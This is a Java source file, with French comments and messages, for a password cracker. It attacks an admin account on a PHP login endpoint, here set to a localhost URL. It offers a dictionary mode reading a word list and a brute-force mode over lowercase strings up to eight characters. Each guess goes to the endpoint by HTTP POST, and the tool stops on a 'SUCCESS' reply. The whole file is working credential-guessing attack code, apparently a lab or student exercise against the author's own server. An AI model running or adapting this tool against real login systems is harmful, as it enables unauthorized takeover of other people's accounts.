import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.util.EntityUtils;
import org.apache.http.entity.StringEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.Scanner;

class PasswordCracker {
    private static final String API_URL = "http://localhost/ServeurPHP/connexion.php";
    private static final String CHARACTER_SET = "abcdefghijklmnopqrstuvwxyz";
    private static final int MAX_PASSWORD_LENGTH = 8;

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Veuillez fournir l'identifiant de l'admin du serveur PHP en argument.");
            return;
        }

        String adminId = args[0];

        Scanner scanner = new Scanner(System.in);

        System.out.println("Craquage de mot de passe\n");

        int choice = 0;
        while (choice != 1 && choice != 2) {
            System.out.println("Choisissez la méthode de craquage :\n");
            System.out.println("1. Dictionnaire\n");
            System.out.println("2. Force brute\n");

            choice = scanner.nextInt();
            scanner.nextLine();

            if (choice != 1 && choice != 2) {
                System.out.println("Veuillez saisir un choix entre 1 et 2.\n");
            }
        }

        boolean passwordCracked = false;

        if (choice == 1) {
            passwordCracked = crackPasswordWithDictionary(adminId);
        } else if (choice == 2) {
            passwordCracked = crackPasswordWithBruteForce(adminId);
        }

        if (passwordCracked) {
            System.out.println("Mot de passe craqué.");
        } else {
            System.out.println("Impossible de craquer le mot de passe.");
        }

        scanner.close();
    }

    private static boolean crackPasswordWithDictionary(String adminId) {
        try (BufferedReader br = new BufferedReader(new FileReader("dictionary.txt"))) {
            String word;
            while ((word = br.readLine()) != null) {
                boolean passwordMatched = sendRequestToAPI(word, adminId);
                if (passwordMatched) {
                    System.out.println("Mot de passe craqué : " + word);
                    return true;
                } else {
                    System.out.println("Comparaison avec le mot de passe du dictionnaire : " + word);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return false;
    }

    private static boolean crackPasswordWithBruteForce(String adminId) {
        boolean passwordCracked = false;
    
        for (int length = 1; length <= MAX_PASSWORD_LENGTH; length++) {
            char[] password = new char[length];
            passwordCracked = generateAndCheckPassword(password, 0, length, adminId);
    
            if (passwordCracked) {
                break;
            }
        }
    
        return passwordCracked;
    }
    
    private static boolean generateAndCheckPassword(char[] password, int position, int length, String adminId) {
        if (position == length) {
            String passwordString = new String(password);
    
            boolean passwordMatched = sendRequestToAPI(passwordString, adminId);
            if (passwordMatched) {
                System.out.println("Mot de passe craqué : " + passwordString);
                System.exit(0);  // Quitte le programme si le mot de passe est trouvé
            } else {
                System.out.println("Comparaison avec le mot de passe : " + passwordString);
            }
    
            return false;
        }
    
        for (int i = 0; i < CHARACTER_SET.length(); i++) {
            password[position] = CHARACTER_SET.charAt(i);
    
            if (generateAndCheckPassword(password, position + 1, length, adminId)) {
                return true;
            }
        }
    
        // Aucun mot de passe trouvé pour cette longueur
        return false;
    }
    
    

    private static boolean sendRequestToAPI(String password, String adminId) {
        CloseableHttpClient httpClient = HttpClients.createDefault();

        try {
            HttpPost request = new HttpPost(API_URL);
            StringEntity params = new StringEntity("adminId=" + adminId + "&password=" + password);
            request.addHeader("content-type", "application/x-www-form-urlencoded");
            request.setEntity(params);

            HttpResponse response = httpClient.execute(request);
            HttpEntity entity = response.getEntity();
            String responseBody = EntityUtils.toString(entity);

            System.out.println("Réponse de l'API : " + responseBody);

            return responseBody.equals("SUCCESS");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                httpClient.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        return false;
    }
}
